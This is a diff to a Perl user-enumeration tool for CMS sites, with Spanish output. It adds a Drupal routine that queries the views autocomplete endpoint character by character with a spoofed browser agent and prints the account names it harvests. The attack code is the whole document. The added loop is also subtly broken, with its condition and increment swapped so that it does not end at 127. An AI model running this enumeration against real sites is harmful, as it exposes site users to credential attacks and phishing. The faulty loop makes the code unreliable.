@@ -47,6 +47,7 @@ if ($flag_type eq "vanilla") { $tail = "/account/"; }
 if ($flag_type eq "bbPress") { $tail = "/profile.php?id="; }
 if ($flag_type eq "WP") { $tail = "/?author="; }
 if ($flag_type eq "SPIP") { $tail = "/spip.php?auteur"; }
+if ($flag_type eq "DRUPAL") { &drupal($flag_url); } 
 
 if ($flag_log) {
 	print "[!] Introduzca la cookie para mandar las peticiones desde su sesion\n\n";
@@ -117,5 +118,28 @@ print q(
 			bbPress --
 			WP	--		WordPress
 			SPIP	--		SPIP CMS
+			DRUPAL  --		Drupal
 );
 }
+
+
+sub drupal {
+	$target = $_[0];
+	$ua = LWP::UserAgent->new; $ua->agent('Mozilla/5.0 (X11; Linux i686; rv:17.0) Gecko/20131030');
+	for ($i = 33; $i++; $i < 127) {
+		$url = $target."/?q=admin/views/ajax/autocomplete/user/".chr($i);
+		print "[+] Comprobando usuarios que empiezan por... ".chr($i)."\n";
+		$response = $ua->get($url);
+		$string = $response->decoded_content;
+		chop($string);
+		$string = substr($string,1);
+		@usuarios = split(",", $string);
+		foreach $user (@usuarios) {
+			@nick = split('":"', $user);
+			$user_clean = substr($nick[0], 1);
+			print "\t\t[-] Usuario encontrado: $user_clean\n";
+		}
+	}
+}
+
+
